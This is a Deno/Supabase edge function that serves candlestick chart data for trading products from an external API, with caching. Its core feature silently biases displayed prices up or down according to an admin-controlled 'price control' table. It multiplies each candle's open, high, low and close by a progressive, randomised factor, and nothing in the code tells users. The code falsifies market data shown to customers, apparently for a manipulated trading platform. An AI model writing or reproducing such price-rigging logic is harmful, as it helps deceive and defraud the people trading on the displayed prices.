/// <reference lib="deno.ns" />

import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type, x-supabase-client-platform, x-supabase-client-platform-version, x-supabase-client-runtime, x-supabase-client-runtime-version",
};

const EXTERNAL_CANDLES_API_URL = "https://admin.stenggg.com/api/candles";

// In-memory cache for kline data
interface CacheEntry {
  data: { candles: unknown[]; nextCursor: string | null; symbol: string };
  timestamp: number;
}

const cache = new Map<string, CacheEntry>();

function getCacheTTL(timeframe: string): number {
  switch (timeframe) {
    case "1m": return 10 * 1000;
    case "5m": return 15 * 1000;
    case "15m": return 20 * 1000;
    case "30m": return 30 * 1000;
    case "1h": return 60 * 1000;
    case "1d": return 5 * 60 * 1000;
    default: return 30 * 1000;
  }
}

function getCacheKey(productId: string, timeframe: string, limit: number, cursor: string | null): string {
  return `${productId}:${timeframe}:${limit}:${cursor || "latest"}`;
}

function getCachedData(key: string, ttl: number): CacheEntry["data"] | null {
  const entry = cache.get(key);
  if (!entry) return null;
  if (Date.now() - entry.timestamp > ttl) { cache.delete(key); return null; }
  return entry.data;
}

function setCacheData(key: string, data: CacheEntry["data"]): void {
  cache.set(key, { data, timestamp: Date.now() });
  if (cache.size > 100) {
    const now = Date.now();
    for (const [k, v] of cache.entries()) {
      if (now - v.timestamp > 5 * 60 * 1000) cache.delete(k);
    }
  }
}

type Timeframe = "1m" | "5m" | "15m" | "30m" | "1h" | "1d";

interface CandleItem {
  time?: number; ts?: number; t?: number;
  open?: number | string; high?: number | string; low?: number | string; close?: number | string;
  vol?: number | string; volume?: number | string;
  o?: number | string; h?: number | string; l?: number | string; c?: number | string; v?: number | string;
}

interface CandlesApiResponse {
  code?: number;
  message?: string;
  data?: CandleItem[] | { list?: CandleItem[]; data?: CandleItem[] };
}

function clamp(n: number, min: number, max: number) {
  return Math.max(min, Math.min(max, n));
}

async function fetchWithRetry(url: string, options: RequestInit, retries = 3, delayMs = 500): Promise<Response> {
  let lastError: Error | null = null;
  for (let i = 0; i < retries; i++) {
    try {
      const response = await fetch(url, options);
      return response;
    } catch (err) {
      lastError = err instanceof Error ? err : new Error(String(err));
      if (i < retries - 1) await new Promise(resolve => setTimeout(resolve, delayMs * Math.pow(2, i)));
    }
  }
  throw lastError || new Error("Fetch failed after retries");
}

/**
 * Apply price control bias to candle data
 */
function applyPriceControlToCandles(
  candles: { time: string; open: number; high: number; low: number; close: number }[],
  direction: string,
  strength: number
): { time: string; open: number; high: number; low: number; close: number }[] {
  if (candles.length === 0) return candles;

  const bias = direction === 'up' ? 1 : -1;

  return candles.map((c, i) => {
    // Progressive bias: later candles get stronger effect
    const progress = (i + 1) / candles.length;
    const factor = 1 + bias * (strength * 0.001) * progress * (0.5 + Math.random() * 0.5);

    return {
      time: c.time,
      open: c.open * factor,
      high: c.high * (direction === 'up' ? factor * (1 + Math.random() * 0.0005) : factor),
      low: c.low * (direction === 'down' ? factor * (1 - Math.random() * 0.0005) : factor),
      close: c.close * factor,
    };
  });
}

Deno.serve(async (req) => {
  if (req.method === "OPTIONS") {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    if (req.method !== "POST") {
      return new Response(JSON.stringify({ error: "Method not allowed" }), {
        status: 405, headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    const SUPABASE_URL = Deno.env.get("SUPABASE_URL");
    const SUPABASE_ANON_KEY = Deno.env.get("SUPABASE_ANON_KEY");
    if (!SUPABASE_URL || !SUPABASE_ANON_KEY) {
      return new Response(JSON.stringify({ error: "Server misconfigured" }), {
        status: 500, headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    const authHeader = req.headers.get("Authorization");
    const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY, {
      global: { headers: authHeader ? { Authorization: authHeader } : {} },
    });

    const body = await req.json().catch(() => ({}));
    const productId = typeof body.productId === "string" ? body.productId : "";
    const timeframe = (body.timeframe as Timeframe) ?? "1h";
    const limitRaw = typeof body.limit === "number" ? body.limit : 200;
    const cursor = typeof body.cursor === "string" ? body.cursor : null;

    if (!productId) {
      return new Response(JSON.stringify({ error: "productId is required" }), {
        status: 400, headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    const uuidRegex = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i;
    if (!uuidRegex.test(productId)) {
      return new Response(JSON.stringify({ error: "Invalid productId format" }), {
        status: 400, headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    const limit = clamp(Math.floor(limitRaw), 50, 500);

    // Check cache (skip if price control is active for this product)
    // We need to check price control first to decide caching
    const SUPABASE_SERVICE_ROLE_KEY = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY");
    let activeControl: { direction: string; strength: number } | null = null;

    if (SUPABASE_SERVICE_ROLE_KEY) {
      const adminClient = createClient(SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY);
      const { data: ctrl } = await adminClient
        .from("product_price_controls")
        .select("direction, strength, is_active, expires_at")
        .eq("product_id", productId)
        .eq("is_active", true)
        .maybeSingle();

      if (ctrl && ctrl.is_active) {
        if (ctrl.expires_at && new Date(ctrl.expires_at) <= new Date()) {
          // Auto-deactivate expired
          await adminClient
            .from("product_price_controls")
            .update({ is_active: false, direction: 'neutral', strength: 1, expires_at: null })
            .eq("product_id", productId);
        } else {
          activeControl = { direction: ctrl.direction, strength: ctrl.strength };
        }
      }
    }

    // Only use cache if no active control (controls add randomness)
    if (!activeControl) {
      const cacheKey = getCacheKey(productId, timeframe, limit, cursor);
      const cacheTTL = getCacheTTL(timeframe);
      const cachedData = getCachedData(cacheKey, cacheTTL);
      
      if (cachedData) {
        return new Response(JSON.stringify(cachedData), {
          status: 200, headers: { ...corsHeaders, "Content-Type": "application/json" },
        });
      }
    }

    // Fetch product symbol
    const { data: product, error: productError } = await supabase
      .from("products")
      .select("name, symbol")
      .eq("id", productId)
      .maybeSingle();

    if (productError || !product) {
      return new Response(JSON.stringify({ error: "Product not found" }), {
        status: 404, headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    let symbol = product.symbol;
    if (!symbol) {
      const name = product.name || "";
      if (name.toLowerCase().includes("wing") || name.toLowerCase().includes("wig")) {
        symbol = "WIG/USDT";
      } else {
        symbol = name.replace(/[^A-Za-z0-9]/g, "").substring(0, 4).toUpperCase() + "/USDT";
      }
    }

    const encodedSymbol = encodeURIComponent(symbol);
    const apiUrl = `${EXTERNAL_CANDLES_API_URL}?symbol=${encodedSymbol}&interval=${timeframe}`;

    let response: Response;
    try {
      response = await fetchWithRetry(apiUrl, {
        method: "GET",
        headers: { "Accept": "application/json", "User-Agent": "ST-Engineering-Chart/1.0" },
      }, 3, 300);
    } catch {
      return new Response(JSON.stringify({ candles: [], nextCursor: null, symbol }), {
        status: 200, headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    if (!response.ok) {
      return new Response(JSON.stringify({ error: "Failed to fetch chart data", status: response.status }), {
        status: 502, headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    const apiData: CandlesApiResponse = await response.json();

    let candleList: CandleItem[] = [];
    if (Array.isArray(apiData.data)) {
      candleList = apiData.data;
    } else if (apiData.data && typeof apiData.data === 'object') {
      if ('data' in apiData.data && Array.isArray((apiData.data as { data?: CandleItem[] }).data)) {
        candleList = (apiData.data as { data: CandleItem[] }).data;
      } else if (apiData.data?.list && Array.isArray(apiData.data.list)) {
        candleList = apiData.data.list;
      }
    }

    let candles = candleList.map((item) => {
      const time = item.ts ?? item.time ?? item.t ?? 0;
      const open = Number(item.open ?? item.o ?? 0);
      const high = Number(item.high ?? item.h ?? 0);
      const low = Number(item.low ?? item.l ?? 0);
      const close = Number(item.close ?? item.c ?? 0);
      const timeMs = time > 1e12 ? time : time * 1000;

      return { time: new Date(timeMs).toISOString(), open, high, low, close };
    }).filter(c => c.open > 0 || c.close > 0)
      .sort((a, b) => new Date(a.time).getTime() - new Date(b.time).getTime());

    // Apply price control bias if active
    if (activeControl) {
      console.log(`[PriceControl] Applying ${activeControl.direction} x${activeControl.strength} to ${candles.length} candles`);
      candles = applyPriceControlToCandles(candles, activeControl.direction, activeControl.strength);
    }

    const nextCursor = candles.length > 0 ? candles[0].time : null;

    const responseData = { candles, nextCursor, symbol };

    // Only cache if no active control
    if (!activeControl) {
      const cacheKey = getCacheKey(productId, timeframe, limit, cursor);
      setCacheData(cacheKey, responseData);
    }

    return new Response(JSON.stringify(responseData), {
      status: 200, headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  } catch (e) {
    console.error("ohlc function error", e);
    return new Response(JSON.stringify({ error: "Unexpected error" }), {
      status: 500, headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  }
});
